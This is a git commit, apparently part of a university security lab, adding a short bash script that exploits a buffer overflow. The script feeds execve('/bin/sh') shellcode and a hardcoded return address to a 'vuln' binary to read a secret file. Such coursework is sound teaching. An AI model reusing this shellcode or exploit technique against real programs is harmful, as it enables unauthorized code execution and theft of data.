fd51204887f2cebbb672925e8537210aff3e0773
Andreas Hiropedi <s2015345@ed.ac.uk>
2023-03-29 16:53:03 +0100

    Add files via upload

---
+++ task3.sh
@@ -0,0 +1,6 @@
+#!/usr/bin/env bash
+SHELLCODE='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
+ADDRESS="\xd0\xdd\xff\xff"
+
+echo /bin/cat /task3/secret.txt | env -i \
+  /task3/s2015345/vuln $(echo -en "$ADDRESS$SHELLCODE") 1184
